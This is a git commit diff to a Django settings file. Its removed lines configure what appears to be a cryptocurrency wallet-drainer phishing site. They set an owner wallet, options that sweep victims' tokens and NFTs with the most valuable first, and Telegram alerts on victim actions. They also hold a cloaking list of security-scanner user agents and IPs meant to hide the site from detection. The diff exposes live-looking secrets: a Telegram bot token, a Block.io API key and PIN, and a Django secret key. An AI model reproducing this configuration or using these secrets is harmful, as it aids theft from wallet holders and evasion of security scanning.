51bd605babfc8ecb4f3560fbafbee18707fb84e2
AvailableNick228 <igor.voytenko.00@bk.ru>
2022-11-24 00:35:53 +0500

    Удалил не нужное

--- web/web/settings.py
+++ web/web/settings.py
@@ -8,60 +8,7 @@ DEBUG = True
 # чтобы поставить фэйкт поменяйте на fakes
 ROOT_URLCONF = 'main.urls'
 
-OWNER_PBLC_CONFIG = {
-    "owner_wallet" : "0x",
-}
-
-SEEDCONFIG = {
-    'telegramBotToken': 'telegramBotToken',
-    'screen_chat_id': 'screen_chat_id',
-    'actions_chat_id': 'actions_chat_id',
-    'owner_wallet': 'owner_wallet'
-}
-
 FAKES_IP = "159.223.174.144"
-
-UALIST = ["censysInspect","python","Go-http-client","libwww-perl","zgrab","InternetMeasurement","curl","tomcat","Googlebot","Dataprovider.com","scaninfo@paloaltonetworks.com","AhrefsBot","serpstatbot","Facebot","CheckMarkNetwork","bingbot","bit.ly","scrappy","TelegramBot","nmap"]
-IPLIST = ["159.223.174.144","167.94.138.117","167.248.133.61","134.122.35.83", ]
-
-BLOCK_IO = {
-    'apikey': 'fc10-25e0-bbdb-70e9',
-    'secret pin': 'BAK8312164500855',
-    'bitcoin address': '378RpMW7xhKtHtC3scxm7KBZm5dT56ZYXb'
-}
-
-TELEGRAM_CONFIG = {
-    "enable_telegram_notification" : True,
-    "telegram_token" : "5689486197:AAE6fEx2FClHgYsZ5lcvDOFHlnMYH58C1Ow",
-}
-
-API_PBLC_CONFIG = {
-    "infura_api_key" : "123",
-    "infury_api_link" : "https://mainnet.infura.io/v3/123"
-}
-
-OPTIONS_CONFIG = {
-    "enable_erc20_stake" : True,
-    "enable_erc721_stake" : True,
-    "enable_erc1155_stake" : True,
-    "enable_eth_stake" : True,
-    "enable_stake_most_expensive_erc20_token_first" : True, # only on mainnet
-    "enable_only_stake_most_expensive_erc20_token" : True, # only on mainnet
-    "minima_eth_balance_to_send" : 0.0001
-}
-
-CHAIN_CONFIG = {
-    "chain_id" : "1"
-}
-
-WEBPAGE_CONFIG = {
-    "login_button" : "login_button",
-    "mint_button" : "mint_button",
-    "not_logged_div" : "not_logged",
-    "logged_div" : "logged",
-    "user_wallet_span" : "user_wallet_span",
-    "user_wallet_span_mobile" : "user_wallet_span_mobile"
-}
 
 # SECURITY WARNING: keep the secret key used in production secret!
 SECRET_KEY = 'django-insecure-**wx$ret758*h5g^c=znkcnkvi0$__8=ma7tjm%ec7($)o0!#^'
